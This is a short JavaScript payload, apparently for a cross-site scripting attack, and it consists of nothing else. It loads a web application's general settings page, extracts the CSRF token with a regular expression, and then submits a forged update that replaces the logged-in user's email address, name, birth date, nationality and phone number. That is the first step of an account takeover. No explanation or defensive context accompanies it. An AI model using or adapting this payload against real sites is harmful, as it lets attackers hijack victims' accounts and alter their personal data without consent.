var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/settings/general',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf-token" content="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/settings/general', true);
    changeReq.send('_token='+token+'&email=testaa@testaaa.com&_method=PUT&last_name=Ahauka&first_name=Makuri&date_de_naissance=1992-11-05&nationalite=BE&phone=0499999999')
};